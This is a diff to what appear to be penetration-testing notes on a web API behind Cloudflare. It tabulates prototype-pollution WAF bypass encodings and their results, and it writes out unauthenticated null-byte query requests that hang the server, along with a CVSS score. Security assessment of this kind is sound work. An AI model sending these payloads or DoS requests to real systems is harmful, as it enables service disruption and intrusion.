@@ -737,10 +737,80 @@ from all angles. None were effective.
 |---------|--------|
 | `%0d%0aX-Injected:true` in params | WAF blocks or stripped |
 
+### WAF Bypass Encoding Matrix (Exhaustive)
+
+Tested every encoding/obfuscation variant for `__proto__` in query params:
+
+| Technique | Result |
+|-----------|--------|
+| `%5f%5fproto%5f%5f` (encode underscores) | WAF block |
+| `__%70%72%6f%74%6f__` (encode 'proto') | WAF block |
+| `__%70roto__` (encode single char p) | WAF block |
+| `__p%72oto__` (encode r) | WAF block |
+| `__pr%6fto__` (encode o) | WAF block |
+| `__pro%74o__` (encode t) | WAF block |
+| `__prot%6f__` (encode last o) | WAF block |
+| `%5f%5f%70%72%6f%74%6f%5f%5f` (full encode) | WAF block |
+| `%5F%5Fproto%5F%5F` (mixed case hex) | WAF block |
+| `x.__proto__.role` (dot notation) | WAF block |
+| `a[__proto__][role]` (nested bracket) | WAF block |
+| `__pro%00to__` (null byte) | WAF pass, **SERVER HANG** |
+| `__pro%09to__` (tab) | WAF pass, user:null (no effect) |
+| `__pro%E2%80%8Bto__` (zero-width space) | WAF pass, user:null |
+| `__pro%E2%80%8Dto__` (zero-width joiner) | WAF pass, user:null |
+| `__\proto__` (backslash) | WAF pass, user:null (intermittent) |
+| `__%C2%ADproto__` (soft hyphen) | WAF pass, user:null |
+| `__%EF%BB%BFproto__` (BOM) | WAF pass, user:null |
+
+For `constructor[prototype]`:
+
+| Technique | Result |
+|-----------|--------|
+| `%63onstructor[prototype]` | WAF block |
+| `%63%6f%6e%73%74%72%75%63%74%6f%72[prototype]` | WAF block |
+| `constructor[%70rototype]` | WAF block |
+| `constructor[%70%72%6f%74%6f%74%79%70%65]` | WAF block |
+| Full encode both | WAF block |
+| `constructor.prototype` (dot) | WAF block |
+| `a[constructor][prototype][role]` | WAF pass, user:null (no effect) |
+
+Cloudflare decodes ALL percent-encoding variants before matching against `__proto__` and
+`constructor`/`prototype` patterns. The only bypasses that reach the server use invisible
+Unicode chars (ZWSP, ZWJ, soft hyphen, BOM) or null bytes -- but the mangled key name
+no longer matches `__proto__` so qs parser treats it as a regular key with no effect.
+
+### Null Byte DoS Finding (NEW - Confirmed)
+
+**Null byte (`%00`) in ANY query parameter key name causes indefinite server hang.**
+
+```
+GET /api/v0/user?random%00key=test -> HANGS (30s+ timeout, never responds)
+GET /api/v0/user?__pro%00to__[x]=1 -> HANGS
+GET /api/v0/user?__%00proto__[x]=1 -> HANGS
+GET /api/v0/user?__p%00roto__[x]=1 -> HANGS
+```
+
+- NO AUTHENTICATION required
+- Each request ties up one server connection indefinitely
+- Normal requests still work in parallel (connection-pool exhaustion, not full crash)
+- `%00` at the START of key gets caught by Cloudflare WAF, any other position passes through
+- Not specific to `__proto__` -- any key with null byte triggers it
+- Likely cause: Express qs parser or MongoDB driver chokes on null byte in property name
+
+**Impact:** Resource exhaustion DoS. With enough concurrent null byte requests, an attacker
+can exhaust the server's connection pool and make the application unresponsive.
+
+**CVSS:** 7.5 High (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
+
 ### Conclusion
 Server-side defenses are solid against PP/SSPP/mass assignment:
 - Cloudflare WAF blocks `__proto__` and `constructor.prototype` in query strings
+- WAF decodes all percent-encoding before matching (single, double, mixed, partial -- all blocked)
+- Only invisible Unicode chars and null bytes bypass WAF, but the mangled key has no PP effect
 - Express body parser accepts `__proto__` in JSON but V8 does not pollute Object.prototype via JSON.parse
+- Urlencoded body PP bypasses WAF entirely but `__proto__` still has no effect (qs v6+ protection)
 - Server reads role/permissions from database, not request object prototype chain
 - Explicit field destructuring on all write endpoints prevents mass assignment
 - HTTP method override not enabled
+- `constructor.prototype` in JSON body causes intermittent 500 (minor instability)
+- **Null byte in query param keys = confirmed unauthenticated DoS (indefinite hang)**
